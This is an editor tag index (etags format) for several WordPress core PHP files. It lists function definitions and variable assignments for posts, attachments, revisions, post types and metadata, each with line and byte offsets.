function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {id1133,32407
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {wp_get_attachment_link1156,33361
function wp_get_attachment_link( $id = 0, $size = 'thumbnail', $permalink = false, $icon = false, $text = false ) {id1156,33361
	$id = intval( $id );id1157,33477
	$_post = & get_post( $id );_post1158,33499
	if ( empty( $_post ) || ( 'attachment' != $_post->post_type ) || ! $url = wp_get_attachment_url( $_post->ID ) )url1160,33529
		$url = get_attachment_link( $_post->ID );url1164,33699
	$post_title = esc_attr( $_post->post_title );post_title1166,33744
		$link_text = $text;link_text1169,33806
		$link_text = wp_get_attachment_image( $id, $size, $icon );link_text1171,33865
		$link_text = '';link_text1173,33932
		$link_text = $_post->post_title;link_text1176,33985
function prepend_attachment($content) {prepend_attachment1190,34366
	$p = '<p class="attachment">';p1196,34510
	$p = apply_filters('prepend_attachment', $p);p1200,34712
function get_the_password_form() {get_the_password_form1217,35029
	$label = 'pwbox-' . ( empty($post->ID) ? rand() : $post->ID );label1219,35079
	$output = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">output1220,35143
function is_page_template( $template = '' ) {is_page_template1241,36060
function is_page_template( $template = '' ) {template1241,36060
	$page_template = get_page_template_slug( get_queried_object_id() );page_template1245,36143
	if ( $template == $page_template )template1250,36273
function get_page_template_slug( $post_id = null ) {get_page_template_slug1268,36737
function get_page_template_slug( $post_id = null ) {post_id1268,36737
	$post = get_post( $post_id );post1269,36790
	$template = get_post_meta( $post->ID, '_wp_page_template', true );template1272,36872
function wp_post_revision_title( $revision, $link = true ) {wp_post_revision_title1291,37430
function wp_post_revision_title( $revision, $link = true ) {link1291,37430
	$datef = _x( 'j F, Y @ G:i', 'revision date format');datef1299,37717
	$autosavef = __( '%1$s [Autosave]' );autosavef1301,37800
	$currentf  = __( '%1$s [Current Revision]' );currentf1303,37867
	$date = date_i18n( $datef, strtotime( $revision->post_modified ) );date1305,37915
	if ( $link && current_user_can( 'edit_post', $revision->ID ) && $link = get_edit_post_link( $revision->ID ) )link1306,37984
		$date = "<a href='$link'>$date</a>";date1307,38095
		$date = sprintf( $currentf, $date );date1310,38177
		$date = sprintf( $autosavef, $date );date1312,38261
function wp_list_post_revisions( $post_id = 0, $args = null ) {wp_list_post_revisions1347,39368
function wp_list_post_revisions( $post_id = 0, $args = null ) {post_id1347,39368
	$defaults = array( 'parent' => false, 'right' => false, 'left' => false, 'format' => 'list', 'type' => 'all' );defaults1351,39481
			$revisions = array( $autosave );revisions1358,39762
	$titlef = _x( '%1$s by %2$s', 'post revision' );titlef1369,40041
	$rows = $right_checked = '';rows1374,40147
	$class = false;class1375,40177
	$can_edit_post = current_user_can( 'edit_post', $post->ID );can_edit_post1376,40194
		$date = wp_post_revision_title( $revision );date1383,40445
		$name = get_the_author_meta( 'display_name', $revision->post_author );name1384,40492
				$left_checked = $left == $revision->ID ? ' checked="checked"' : '';left_checked1388,40617
				$left_checked = $right_checked ? ' checked="checked"' : ''; // [sic] (the next one)left_checked1390,40697
			$right_checked = $right == $revision->ID ? ' checked="checked"' : '';right_checked1391,40785
			$class = $class ? '' : " class='alternate'";class1393,40859
				$actions = '<a href="' . wp_nonce_url( add_query_arg( array( 'revision' => $revision->ID, 'action' => 'restore' ) ), "restore-post_$post->ID|$revision->ID" ) . '">' . __( 'Restore' ) . '</a>';actions1396,40963
				$actions = '';actions1398,41168
			$title = sprintf( $titlef, $date, $name );title1408,41654

wordpress/wp-includes/post-thumbnail-template.php,1445
function has_post_thumbnail( $post_id = null ) {has_post_thumbnail20,396
function has_post_thumbnail( $post_id = null ) {post_id20,396
function get_post_thumbnail_id( $post_id = null ) {get_post_thumbnail_id32,616
function get_post_thumbnail_id( $post_id = null ) {post_id32,616
	$post_id = ( null === $post_id ) ? get_the_ID() : $post_id;post_id33,668
function the_post_thumbnail( $size = 'post-thumbnail', $attr = '' ) {the_post_thumbnail45,1075
function the_post_thumbnail( $size = 'post-thumbnail', $attr = '' ) {size45,1075
function update_post_thumbnail_cache( $wp_query = null ) {update_post_thumbnail_cache56,1371
function update_post_thumbnail_cache( $wp_query = null ) {wp_query56,1371
		$wp_query = $GLOBALS['wp_query'];wp_query58,1450
	$thumb_ids = array();thumb_ids63,1535
		if ( $id = get_post_thumbnail_id( $post->ID ) )id65,1599
function get_the_post_thumbnail( $post_id = null, $size = 'post-thumbnail', $attr = '' ) {get_the_post_thumbnail85,2054
function get_the_post_thumbnail( $post_id = null, $size = 'post-thumbnail', $attr = '' ) {post_id85,2054
	$post_id = ( null === $post_id ) ? get_the_ID() : $post_id;post_id86,2145
	$post_thumbnail_id = get_post_thumbnail_id( $post_id );post_thumbnail_id87,2206
	$size = apply_filters( 'post_thumbnail_size', $size );size88,2263
		$html = wp_get_attachment_image( $post_thumbnail_id, $size, false, $attr );html93,2570
		$html = '';html96,2743

wordpress/wp-includes/post.php,62390
function create_initial_post_types() {create_initial_post_types19,244
 * The function works by getting the single post meta name, namedworks167,5629
 * '_wp_attached_file' and returning it. This is a convenience function toto168,5695
function get_attached_file( $attachment_id, $unfiltered = false ) {get_attached_file179,6193
function get_attached_file( $attachment_id, $unfiltered = false ) {unfiltered179,6193
	$file = get_post_meta( $attachment_id, '_wp_attached_file', true );file180,6261
		$file = $uploads['basedir'] . "/$file";file183,6521
function update_attached_file( $attachment_id, $file ) {update_attached_file202,7128
	$file = apply_filters( 'update_attached_file', $file, $attachment_id );file206,7238
	$file = _wp_relative_upload_path($file);file207,7311
function _wp_relative_upload_path( $path ) {_wp_relative_upload_path223,7746
	$new_path = $path;new_path224,7791
				$new_path = str_replace($uploads['basedir'], '', $new_path);new_path228,7938
				$new_path = ltrim($new_path, '/');new_path229,8003
 * of them. It is then noted that while this function does not work on posts, itdoes242,8416
 * The arguments listed as defaults are for this function and also of theand252,8975
function get_children($args = '', $output = OBJECT) {get_children284,10794
function get_children($args = '', $output = OBJECT) {output284,10794
	$kids = array();kids285,10848
			$args = array('post_parent' => (int) $GLOBALS['post']->post_parent );args288,10928
		$args = array('post_parent' => (int) $args->post_parent );args293,11068
		$args = array('post_parent' => (int) $args);args295,11165
	$defaults = array(defaults298,11216
	$r = wp_parse_args( $args, $defaults );r303,11332
	$children = get_posts( $r );children305,11374
	foreach ( $children as $key => $child )key312,11473
	if ( $output == OBJECT ) {output315,11554
	} elseif ( $output == ARRAY_A ) {output317,11598
	} elseif ( $output == ARRAY_N ) {output321,11744
function get_extended($post) {get_extended346,12571
		$more_text = $matches[1];more_text350,12756
		$main = $post;main352,12794
		$extended = '';extended353,12811
		$more_text = '';more_text354,12829
	$main = preg_replace('/^[\s]*(.*)[\s]*$/', '\\1', $main);main358,12894
	$extended = preg_replace('/^[\s]*(.*)[\s]*$/', '\\1', $extended);extended359,12953
	$more_text = preg_replace('/^[\s]*(.*)[\s]*$/', '\\1', $more_text);more_text360,13020
function &get_post(&$post, $output = OBJECT, $filter = 'raw') {get_post380,13717
function &get_post(&$post, $output = OBJECT, $filter = 'raw') {output380,13717
	$null = null;null382,13796
			$_post = & $GLOBALS['post'];_post386,13868
		$_post = sanitize_post($post, 'raw');_post391,14011
		$_post = $post;_post394,14154
			$post_id = $post->ID;post_id397,14208
			$post_id = $post;post_id399,14240
		$post_id = (int) $post_id;post_id401,14262
		if ( ! $_post = wp_cache_get($post_id, 'posts') ) {_post402,14291
			$_post = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d LIMIT 1", $post_id));_post403,14345
			$_post = sanitize_post($_post, 'raw');_post407,14520
		$_post = sanitize_post($_post, $filter);_post413,14639
	if ( $output == OBJECT ) {output415,14683
	} elseif ( $output == ARRAY_A ) {output417,14728
		$__post = get_object_vars($_post);__post418,14763
	} elseif ( $output == ARRAY_N ) {output420,14818
		$__post = array_values(get_object_vars($_post));__post421,14853
function get_post_ancestors($post) {get_post_ancestors436,15132
	$post = get_post($post);post437,15169
function get_post_field( $field, $post, $context = 'display' ) {get_post_field465,15994
function get_post_field( $field, $post, $context = 'display' ) {context465,15994
	$post = (int) $post;post466,16059
	$post = get_post( $post );post467,16081
 * This function can be used with any post type, but it makes more sense withcan484,16381
function get_post_mime_type($ID = '') {get_post_mime_type492,16603
	$post = & get_post($ID);post493,16643
function get_post_format( $post = null ) {get_post_format510,16942
function get_post_format( $post = null ) {post510,16942
	$post = get_post($post);post511,16985
	$_format = get_the_terms( $post->ID, 'post_format' );_format516,17094
	$format = array_shift( $_format );format521,17193
function has_post_format( $format, $post = null ) {has_post_format536,17614
function has_post_format( $format, $post = null ) {post536,17614
function set_post_format( $post, $format ) {set_post_format549,18060
	$post = get_post($post);post550,18105
		$format = sanitize_key($format);format556,18239
			$format = '';format558,18368
			$format = 'post-format-' . $format;format560,18392
function get_post_status($ID = '') {get_post_status577,18758
	$post = get_post($ID);post578,18795
function get_post_statuses( ) {get_post_statuses609,19548
	$status = array(status610,19580
function get_page_statuses( ) {get_page_statuses630,19991
	$status = array(status631,20023
 * A simple function for creating or modifying a post status based on thefor643,20215
 * parameters given. The function will accept an array (second optionalwill644,20289
function register_post_status($post_status, $args = array()) {register_post_status667,21400
function register_post_status($post_status, $args = array()) {args667,21400
		$wp_post_statuses = array();wp_post_statuses671,21526
	$defaults = array('label' => false, 'label_count' => false, 'exclude_from_search' => null, '_builtin' => false, '_edit_link' => 'post.php?post=%d', 'capability_type' => 'post', 'hierarchical' => false, 'public' => null, 'internal' => null, 'protected' => null, 'private' => null, 'show_in_admin_all' => null, 'publicly_queryable' => null, 'show_in_admin_status_list' => null, 'show_in_admin_all_list' => null, 'single_view_cap' => null);defaults674,21626
	$args = wp_parse_args($args, $defaults);args675,22065
	$args = (object) $args;args676,22107
	$post_status = sanitize_key($post_status);post_status678,22133
function get_post_status_object( $post_status ) {get_post_status_object735,23602
function get_post_stati( $args = array(), $output = 'names', $operator = 'and' ) {get_post_stati760,24464
function get_post_stati( $args = array(), $output = 'names', $operator = 'and' ) {args760,24464
	$field = ('names' == $output) ? 'name' : false;field763,24575
function is_post_type_hierarchical( $post_type ) {is_post_type_hierarchical779,24977
	$post_type = get_post_type_object( $post_type );post_type783,25086
function post_type_exists( $post_type ) {post_type_exists796,25367
function get_post_type( $the_post = false ) {get_post_type810,25720
function get_post_type( $the_post = false ) {the_post810,25720
		$the_post = $post;the_post814,25810
		$the_post = get_post($the_post);the_post816,25865
function get_post_type_object( $post_type ) {get_post_type_object837,26265
function get_post_types( $args = array(), $output = 'names', $operator = 'and' ) {get_post_types861,27066
function get_post_types( $args = array(), $output = 'names', $operator = 'and' ) {args861,27066
	$field = ('names' == $output) ? 'name' : false;field864,27174
 * A function for creating or modifying a post type based on thefor872,27356
 * parameters given. The function will accept an array (second optionalwill873,27421
 * - public - Whether a post type is intended for use publicly either via the admin interface or by front-end users.or883,28027
 * - register_meta_box_cb - Provide a callback function that will be called when setting up thethat921,30895
function register_post_type( $post_type, $args = array() ) {register_post_type956,33633
function register_post_type( $post_type, $args = array() ) {args956,33633
		$wp_post_types = array();wp_post_types960,33771
	$defaults = array(defaults963,33868
	$args = wp_parse_args($args, $defaults);args974,34535
	$args = (object) $args;args975,34577
	$post_type = sanitize_key($post_type);post_type977,34603
			$archive_slug = $args->has_archive === true ? $args->rewrite['slug'] : $args->has_archive;archive_slug1059,37679
				$archive_slug = substr( $wp_rewrite->front, 1 ) . $archive_slug;archive_slug1061,37812
				$archive_slug = $wp_rewrite->root . $archive_slug;archive_slug1063,37889
				$feeds = '(' . trim( implode( '|', $wp_rewrite->feeds ) ) . ')';feeds1067,38089
function get_post_type_capabilities( $args ) {get_post_type_capabilities1150,42078
	$default_capabilities = array(default_capabilities1157,42407
		$default_capabilities_for_mapping = array(default_capabilities_for_mapping1171,43024
		$default_capabilities = array_merge( $default_capabilities, $default_capabilities_for_mapping );default_capabilities1180,43515
	$capabilities = array_merge( $default_capabilities, $args->capabilities );capabilities1183,43618
function _post_type_meta_capabilities( $capabilities = null ) {_post_type_meta_capabilities1198,43978
function _post_type_meta_capabilities( $capabilities = null ) {capabilities1198,43978
	static $meta_caps = array();meta_caps1199,44042
	static $meta_caps = array();meta_caps1199,44042
	foreach ( $capabilities as $core => $custom ) {core1202,44124
function get_post_type_labels( $post_type_object ) {get_post_type_labels1232,45885
	$nohier_vs_hier_defaults = array(nohier_vs_hier_defaults1233,45938
function _get_custom_object_labels( $object, $nohier_vs_hier_defaults ) {_get_custom_object_labels1257,47180
	foreach ( $nohier_vs_hier_defaults as $key => $value )key1274,47998
	$labels = array_merge( $defaults, $object->labels );labels1277,48123
function _add_post_type_submenus() {_add_post_type_submenus1287,48284
		$ptype_obj = get_post_type_object( $ptype );ptype_obj1289,48391
function add_post_type_support( $post_type, $feature ) {add_post_type_support1312,49485
	$features = (array) $feature;features1315,49576
function remove_post_type_support( $post_type, $feature ) {remove_post_type_support1331,50031
function get_all_post_type_supports( $post_type ) {get_all_post_type_supports1349,50429
function post_type_supports( $post_type, $feature ) {post_type_supports1367,50842
function set_post_type( $post_id = 0, $post_type = 'post' ) {set_post_type1397,51641
function set_post_type( $post_id = 0, $post_type = 'post' ) {post_id1397,51641
	$post_type = sanitize_post_field('post_type', $post_type, $post_id, 'db');post_type1400,51719
	$return = $wpdb->update( $wpdb->posts, array('post_type' => $post_type), array('ID' => $post_id) );return1401,51795
function get_posts($args = null) {get_posts1433,53103
	$defaults = array(defaults1434,53138
	$r = wp_parse_args( $args, $defaults );r1443,53403
		$incposts = wp_parse_id_list( $r['include'] );incposts1451,53767
	$get_posts = new WP_Query;get_posts1460,54088
function add_post_meta($post_id, $meta_key, $meta_value, $unique = false) {add_post_meta1484,54670
function add_post_meta($post_id, $meta_key, $meta_value, $unique = false) {unique1484,54670
	if ( $the_post = wp_is_post_revision($post_id) )the_post1486,54802
		$post_id = $the_post;post_id1487,54852
function delete_post_meta($post_id, $meta_key, $meta_value = '') {delete_post_meta1508,55519
function delete_post_meta($post_id, $meta_key, $meta_value = '') {meta_value1508,55519
	if ( $the_post = wp_is_post_revision($post_id) )the_post1510,55642
		$post_id = $the_post;post_id1511,55692
function get_post_meta($post_id, $key = '', $single = false) {get_post_meta1529,56239
function get_post_meta($post_id, $key = '', $single = false) {key1529,56239
function update_post_meta($post_id, $meta_key, $meta_value, $prev_value = '') {update_post_meta1551,56946
function update_post_meta($post_id, $meta_key, $meta_value, $prev_value = '') {prev_value1551,56946
	if ( $the_post = wp_is_post_revision($post_id) )the_post1553,57082
		$post_id = $the_post;post_id1554,57132
function delete_post_meta_by_key($post_meta_key) {delete_post_meta_by_key1568,57477
 * so the function is optimized to be called more than once.is1576,57722
function get_post_custom( $post_id = 0 ) {get_post_custom1584,57929
function get_post_custom( $post_id = 0 ) {post_id1584,57929
	$post_id = absint( $post_id );post_id1585,57972
		$post_id = get_the_ID();post_id1587,58023
function get_post_custom_keys( $post_id = 0 ) {get_post_custom_keys1603,58428
function get_post_custom_keys( $post_id = 0 ) {post_id1603,58428
	$custom = get_post_custom( $post_id );custom1604,58476
	if ( $keys = array_keys($custom) )keys1609,58555
function get_post_custom_values( $key = '', $post_id = 0 ) {get_post_custom_values1626,59015
function get_post_custom_values( $key = '', $post_id = 0 ) {key1626,59015
	$custom = get_post_custom($post_id);custom1630,59106
function is_sticky( $post_id = 0 ) {is_sticky1646,59482
function is_sticky( $post_id = 0 ) {post_id1646,59482
	$post_id = absint( $post_id );post_id1647,59519
		$post_id = get_the_ID();post_id1650,59571
	$stickies = get_option( 'sticky_posts' );stickies1652,59599
function sanitize_post($post, $context = 'display') {sanitize_post1675,60232
function sanitize_post($post, $context = 'display') {context1675,60232
		if ( isset($post->filter) && $context == $post->filter )context1678,60366
		if ( isset($post['filter']) && $context == $post['filter'] )context1687,60721
 *  $post_id if $context == 'edit' and field name prefix == 'post_'.context1707,61408
 * @uses apply_filters() Calls 'edit_post_$field' passing $value and $post_id if $context == 'db'.context1709,61480
 * @uses apply_filters() Calls 'pre_$field' passing $value if $context == 'db' and field name prefix == 'post_'.context1710,61579
 * @uses apply_filters() Calls '{$field}_pre' passing $value if $context == 'db' and field name prefix != 'post_'.context1711,61692
 * @uses apply_filters() Calls '$field' passing $value, $post_id and $context if $context == anythingcontext1713,61810
 * @uses apply_filters() Calls 'post_$field' passing $value if $context == anything other than 'raw',context1715,61984
function sanitize_post_field($field, $value, $post_id, $context) {sanitize_post_field1725,62447
	$int_fields = array('ID', 'post_parent', 'menu_order');int_fields1726,62514
		$value = (int) $value;value1728,62609
	$array_int_fields = array( 'ancestors' );array_int_fields1731,62676
		$value = array_map( 'absint', $value);value1733,62765
	$prefixed = false;prefixed1740,62871
		$prefixed = true;prefixed1742,62935
		$field_no_prefix = str_replace('post_', '', $field);field_no_prefix1743,62955
		$format_to_edit = array('post_content', 'post_excerpt', 'post_title', 'post_password');format_to_edit1747,63043
			$value = apply_filters("edit_{$field}", $value, $post_id);value1750,63155
			$value = apply_filters("{$field_no_prefix}_edit_pre", $value, $post_id);value1752,63234
			$value = apply_filters("edit_post_{$field}", $value, $post_id);value1754,63321
				$value = format_to_edit($value, user_can_richedit());value1759,63473
				$value = format_to_edit($value);value1761,63539
			$value = esc_attr($value);value1763,63587
			$value = apply_filters("pre_{$field}", $value);value1767,63676
			$value = apply_filters("{$field_no_prefix}_save_pre", $value);value1768,63727
			$value = apply_filters("pre_post_{$field}", $value);value1770,63804
			$value = apply_filters("{$field}_pre", $value);value1771,63860
			$value = apply_filters($field, $value, $post_id, $context);value1776,63981
			$value = apply_filters("post_{$field}", $value, $post_id, $context);value1778,64051
		$value = esc_attr($value);value1782,64159
		$value = esc_js($value);value1784,64218
function stick_post($post_id) {stick_post1798,64419
	$stickies = get_option('sticky_posts');stickies1799,64451
		$stickies = array($post_id);stickies1802,64522
function unstick_post($post_id) {unstick_post1819,64817
	$stickies = get_option('sticky_posts');stickies1820,64851
	$offset = array_search($post_id, $stickies);offset1828,64984
 * This function provides an efficient method of finding the amount of post'sprovides1840,65236
 * when developing for 2.5+, use this function instead.instead1843,65464
function wp_count_posts( $type = 'post', $perm = '' ) {wp_count_posts1855,65926
function wp_count_posts( $type = 'post', $perm = '' ) {type1855,65926
	$user = wp_get_current_user();user1858,65998
	$cache_key = $type;cache_key1860,66031
	$query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";query1862,66053
		$post_type_object = get_post_type_object($type);post_type_object1864,66204
	$count = wp_cache_get($cache_key, 'counts');count1872,66531
	$count = $wpdb->get_results( $wpdb->prepare( $query, $type ), ARRAY_A );count1876,66620
	$stats = array();stats1878,66695
	$stats = (object) $stats;stats1885,66865
function wp_count_attachments( $mime_type = '' ) {wp_count_attachments1904,67475
function wp_count_attachments( $mime_type = '' ) {mime_type1904,67475
	$and = wp_post_mime_type_where( $mime_type );and1907,67542
	$count = $wpdb->get_results( "SELECT post_mime_type, COUNT( * ) AS num_posts FROM $wpdb->posts WHERE post_type = 'attachment' AND post_status != 'trash' $and GROUP BY post_mime_type", ARRAY_A );count1908,67589
	$stats = array( );stats1910,67786
function wp_match_mime_types($wildcard_mime_types, $real_mime_types) {wp_match_mime_types1933,68544
	$matches = array();matches1934,68615
		$wildcard_mime_types = array_map('trim', explode(',', $wildcard_mime_types));wildcard_mime_types1936,68676
		$real_mime_types = array_map('trim', explode(',', $real_mime_types));real_mime_types1938,68792
	$wild = '[-._a-z0-9]*';wild1939,68864
		$type = str_replace('*', $wild, $type);type1941,68942
		foreach ( $patterns as $type => $pattern )type1950,69199
function wp_post_mime_type_where($post_mime_types, $table_alias = '') {wp_post_mime_type_where1966,69762
function wp_post_mime_type_where($post_mime_types, $table_alias = '') {table_alias1966,69762
	$where = '';where1967,69834
	$wildcards = array('', '%', '%/%');wildcards1968,69848
		$post_mime_types = array_map('trim', explode(',', $post_mime_types));post_mime_types1970,69921
		$mime_type = preg_replace('/\s/', '', $mime_type);mime_type1972,70047
		$slashpos = strpos($mime_type, '/');slashpos1973,70100
			$mime_group = preg_replace('/[^-*.a-zA-Z0-9]/', '', substr($mime_type, 0, $slashpos));mime_group1975,70170
			$mime_subgroup = preg_replace('/[^-*.+a-zA-Z0-9]/', '', substr($mime_type, $slashpos + 1));mime_subgroup1976,70260
				$mime_subgroup = '*';mime_subgroup1978,70387
				$mime_subgroup = str_replace('/', '', $mime_subgroup);mime_subgroup1980,70421
			$mime_pattern = "$mime_group/$mime_subgroup";mime_pattern1981,70480
			$mime_pattern = preg_replace('/[^-*.a-zA-Z0-9]/', '', $mime_type);mime_pattern1983,70540
		$mime_pattern = preg_replace('/\*+/', '%', $mime_pattern);mime_pattern1988,70689
		$where = ' AND (' . join(' OR ', $wheres) . ') ';where1999,71142
function wp_delete_post( $postid = 0, $force_delete = false ) {wp_delete_post2022,72066
function wp_delete_post( $postid = 0, $force_delete = false ) {postid2022,72066
	$parent_data = array( 'post_parent' => $post->post_parent );parent_data2041,72781
	$parent_where = array( 'post_parent' => $postid );parent_where2042,72843
		$children_query = $wpdb->prepare( "SELECT * FROM $wpdb->posts WHERE post_parent = %d AND post_type = %s", $postid, $post->post_type );children_query2046,73042
		$children = $wpdb->get_results( $children_query );children2047,73179
	$revision_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'revision'", $postid ) );revision_ids2067,73805
	$comment_ids = $wpdb->get_col( $wpdb->prepare( "SELECT comment_ID FROM $wpdb->comments WHERE comment_post_ID = %d", $postid ));comment_ids2075,74297
	$post_meta_ids = $wpdb->get_col( $wpdb->prepare( "SELECT meta_id FROM $wpdb->postmeta WHERE post_id = %d ", $postid ));post_meta_ids2079,74510
function wp_trash_post($post_id = 0) {wp_trash_post2114,75494
function wp_untrash_post($post_id = 0) {wp_untrash_post2149,76303
	$post_status = get_post_meta($post_id, '_wp_trash_meta_status', true);post_status2158,76512
function wp_trash_post_comments($post = null) {wp_trash_post_comments2184,77123
	$post = get_post($post);post2187,77187
	$post_id = $post->ID;post_id2191,77245
	$comments = $wpdb->get_results( $wpdb->prepare("SELECT comment_ID, comment_approved FROM $wpdb->comments WHERE comment_post_ID = %d", $post_id) );comments2195,77315
	$statuses = array();statuses2200,77541
	$result = $wpdb->update($wpdb->comments, array('comment_approved' => 'post-trashed'), array('comment_post_ID' => $post_id));result2206,77782
function wp_untrash_post_comments($post = null) {wp_untrash_post_comments2225,78314
	$post = get_post($post);post2228,78380
	$post_id = $post->ID;post_id2232,78438
	$statuses = get_post_meta($post_id, '_wp_trash_meta_comments_status', true);statuses2234,78462
	$group_by_status = array();group_by_status2242,78678
	foreach ( $statuses as $comment_id => $comment_status )comment_id2243,78707
	foreach ( $group_by_status as $status => $comments ) {status2246,78818
			$status = '0';status2249,78951
		$comments_in = implode( "', '", $comments );comments_in2250,78969
function wp_get_post_categories( $post_id = 0, $args = array() ) {wp_get_post_categories2275,79729
function wp_get_post_categories( $post_id = 0, $args = array() ) {post_id2275,79729
	$post_id = (int) $post_id;post_id2276,79796
	$defaults = array('fields' => 'ids');defaults2278,79825
	$args = wp_parse_args( $args, $defaults );args2279,79864
	$cats = wp_get_object_terms($post_id, 'category', $args);cats2281,79909
function wp_get_post_tags( $post_id = 0, $args = array() ) {wp_get_post_tags2302,80500
function wp_get_post_tags( $post_id = 0, $args = array() ) {post_id2302,80500
function wp_get_post_terms( $post_id = 0, $taxonomy = 'post_tag', $args = array() ) {wp_get_post_terms2324,81227
function wp_get_post_terms( $post_id = 0, $taxonomy = 'post_tag', $args = array() ) {post_id2324,81227
	$post_id = (int) $post_id;post_id2325,81313
	$defaults = array('fields' => 'all');defaults2327,81342
	$args = wp_parse_args( $args, $defaults );args2328,81381
	$tags = wp_get_object_terms($post_id, $taxonomy, $args);tags2330,81426
function wp_get_recent_posts( $args = array(), $output = ARRAY_A ) {wp_get_recent_posts2347,81763
function wp_get_recent_posts( $args = array(), $output = ARRAY_A ) {args2347,81763
		$args = array( 'numberposts' => absint( $args ) );args2351,82005
	$defaults = array(defaults2355,82088
	$r = wp_parse_args( $args, $defaults );r2364,82405
	$results = get_posts( $r );results2366,82447
		foreach( $results as $key => $result ) {key2370,82585
function wp_get_single_post($postid = 0, $mode = OBJECT) {wp_get_single_post2392,83137
function wp_get_single_post($postid = 0, $mode = OBJECT) {mode2392,83137
	$postid = (int) $postid;postid2393,83196
	$post = get_post($postid, $mode);post2395,83223
	if ( $mode == OBJECT ) {mode2404,83437
function wp_insert_post($postarr, $wp_error = false) {wp_insert_post2460,86064
function wp_insert_post($postarr, $wp_error = false) {wp_error2460,86064
	$defaults = array('post_status' => 'draft', 'post_type' => 'post', 'post_author' => $user_ID,defaults2463,86145
	$postarr = wp_parse_args($postarr, $defaults);postarr2469,86525
	$postarr = sanitize_post($postarr, 'db');postarr2473,86607
	$update = false;update2479,86746
		$update = true;update2481,86786
		$previous_status = get_post_field('post_status', $ID);previous_status2482,86804
		$previous_status = 'new';previous_status2484,86871
	$maybe_empty = ! $post_content && ! $post_title && ! $post_excerpt && post_type_supports( $post_type, 'editor' )maybe_empty2487,86903
		$post_type = 'post';post_type2497,87354
		$post_status = 'draft';post_status2500,87406
		$post_category = array_filter($post_category); // Filter out empty termspost_category2503,87464
			$post_category = array( get_option('default_category') );post_category2509,87776
			$post_category = array();post_category2511,87844
		$post_author = $user_ID;post_author2515,87905
	$post_ID = 0;post_ID2517,87933
		$post_ID = (int) $ID;post_ID2521,87996
		$guid = get_post_field( 'guid', $post_ID );guid2522,88020
		$post_before = get_post($post_ID);post_before2523,88066
		$post_name = '';post_name2528,88256
			$post_name = sanitize_title($post_title);post_name2534,88481
			$post_name = '';post_name2536,88533
		$check_name = sanitize_title( $post_name, '', 'old-save' );check_name2539,88655
			$post_name = $check_name;post_name2541,88843
			$post_name = sanitize_title($post_name);post_name2543,88913
		$post_date = current_time('mysql');post_date2548,89148
			$post_date_gmt = get_gmt_from_date($post_date);post_date_gmt2552,89340
			$post_date_gmt = '0000-00-00 00:00:00';post_date_gmt2554,89398
		$post_modified     = current_time( 'mysql' );post_modified2558,89502
		$post_modified_gmt = current_time( 'mysql', 1 );post_modified_gmt2559,89550
		$post_modified     = $post_date;post_modified2561,89611
		$post_modified_gmt = $post_date_gmt;post_modified_gmt2562,89646
		$now = gmdate('Y-m-d H:i:59');now2566,89725
			$post_status = 'future';post_status2568,89837
		$now = gmdate('Y-m-d H:i:59');now2570,89905
			$post_status = 'publish';post_status2572,90018
			$comment_status = 'closed';comment_status2577,90101
			$comment_status = get_option('default_comment_status');comment_status2579,90139
		$ping_status = get_option('default_ping_status');ping_status2582,90229
		$to_ping = sanitize_trackback_urls( $to_ping );to_ping2585,90306
		$to_ping = '';to_ping2587,90362
		$pinged = '';pinged2590,90405
		$post_parent = (int) $post_parent;post_parent2593,90450
		$post_parent = 0;post_parent2595,90493
	$post_parent = apply_filters( 'wp_insert_post_parent', $post_parent, $post_ID, compact( array_keys( $postarr ) ), $postarr );post_parent2598,90581
		$menu_order = (int) $menu_order;menu_order2601,90736
		$menu_order = 0;menu_order2603,90777
		$post_password = '';post_password2606,90857
	$post_name = wp_unique_post_slug($post_name, $post_ID, $post_status, $post_type, $post_parent);post_name2608,90881
	$data = compact( array( 'post_author', 'post_date', 'post_date_gmt', 'post_content', 'post_content_filtered', 'post_title', 'post_excerpt', 'post_status', 'post_type', 'comment_status', 'ping_status', 'post_password', 'post_name', 'to_ping', 'pinged', 'post_modified', 'post_modified_gmt', 'post_parent', 'menu_order', 'guid' ) );data2611,91014
	$data = apply_filters('wp_insert_post_data', $data, $postarr);data2612,91346
	$data = stripslashes_deep( $data );data2613,91410
	$where = array( 'ID' => $post_ID );where2614,91447
			$import_id = (int) $import_id;import_id2629,91992
		$post_ID = (int) $wpdb->insert_id;post_ID2640,92383
		$where = array( 'ID' => $post_ID );where2643,92459
		foreach ( $tax_input as $taxonomy => $tags ) {taxonomy2659,93086
			$taxonomy_obj = get_taxonomy($taxonomy);taxonomy_obj2660,93135
				$tags = array_filter($tags);tags2662,93257
	$current_guid = get_post_field( 'guid', $post_ID );current_guid2668,93412
	$post = get_post($post_ID);post2676,93639
		$page_templates = get_page_templates();page_templates2680,93775
		$post_after = get_post($post_ID);post_after2694,94244
function wp_update_post($postarr = array()) {wp_update_post2715,94779
		$postarr = get_object_vars($postarr);postarr2718,94888
		$postarr = add_magic_quotes($postarr);postarr2719,94928
	$post = wp_get_single_post($postarr['ID'], ARRAY_A);post2723,95015
	$post = add_magic_quotes($post);post2726,95102
		$post_cats = $postarr['post_category'];post_cats2731,95340
		$post_cats = $post['post_category'];post_cats2733,95388
		$clear_date = true;clear_date2738,95708
		$clear_date = false;clear_date2740,95736
	$postarr = array_merge($post, $postarr);postarr2743,95827
function wp_publish_post($post_id) {wp_publish_post2766,96387
	$post = get_post($post_id);post2769,96440
	$old_status = $post->post_status;old_status2779,96650
function check_and_publish_future_post($post_id) {check_and_publish_future_post2799,97257
	$post = get_post($post_id);post2801,97309
	$time = strtotime( $post->post_date_gmt . ' GMT' );time2809,97421
function wp_unique_post_slug( $slug, $post_ID, $post_status, $post_type, $post_parent ) {wp_unique_post_slug2834,98279
	$feeds = $wp_rewrite->feeds;feeds2840,98491
		$feeds = array();feeds2842,98550
	$hierarchical_post_types = get_post_types( array('hierarchical' => true) );hierarchical_post_types2844,98571
		$check_sql = "SELECT post_name FROM $wpdb->posts WHERE post_name = %s AND ID != %d LIMIT 1";check_sql2847,98740
		$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $slug, $post_ID ) );post_name_check2848,98835
			$suffix = 2;suffix2851,99058
